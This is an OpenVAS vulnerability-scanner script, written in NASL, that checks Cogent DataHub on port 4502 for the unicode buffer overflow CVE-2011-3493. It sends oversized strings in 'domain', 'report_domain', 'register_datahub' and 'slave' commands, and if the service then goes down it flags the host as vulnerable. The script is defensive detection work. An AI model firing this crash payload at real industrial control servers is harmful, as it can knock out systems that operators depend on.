###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cogent_datahub_unicode_bof_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Cogent DataHub Unicode Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802246");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-09-22 10:24:03 +0200 (Thu, 22 Sep 2011)");
  script_bugtraq_id(49611);
  script_cve_id("CVE-2011-3493");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Cogent DataHub Unicode Buffer Overflow Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/45967");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/cogent_1-adv.txt");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-256-03.pdf");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(4502);
  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute
arbitrary code within the context of the privileged domain or cause a denial
of service condition.");
  script_tag(name:"affected", value:"Cogent DataHub 7.1.1.63 and prior.");
  script_tag(name:"insight", value:"The flaw is due to a stack based unicode buffer overflow error
in the 'DH_OneSecondTick' function, which can be exploited by sending specially
crafted 'domain', 'report_domain', 'register_datahub', or 'slave' commands.");
  script_tag(name:"solution", value:"Upgrade to Cogent DataHub version 7.1.2 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"The host is running Cogent DataHub and is prone to buffer
overflow vulnerability.");
  script_xref(name:"URL", value:"http://www.cogentdatahub.com/Products/Cogent_DataHub.html");
  exit(0);
}


include("http_func.inc");

port = 4502;
if(!get_port_state(port)){
 exit(0);
}

soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Send normal request
req = string('(domain "openvas-test")', raw_string(0x0a));
send(socket:soc, data:req);
res = recv(socket:soc, length:1024);

if('success "domain" "openvas-test"' >!< res){
  exit(0);
}

attack =  crap(data: "a", length:512);
req = string('(domain "', attack, '")', raw_string(0x0a),
             '(report_domain "', attack, '" 1)', raw_string(0x0a),
             '(register_datahub "',attack, '")\r\n', raw_string(0x0a),
             '(slave "', attack, '" flags id1 id2 version secs nsecs)',
             raw_string(0x0a));

## Sending Attack
send(socket:soc, data:req);
res = recv(socket:soc, length:1024);
close(soc);

sleep(5);

soc = open_sock_tcp(port);
if(!soc){
  security_message(port);
  exit(0);
}
close(soc);
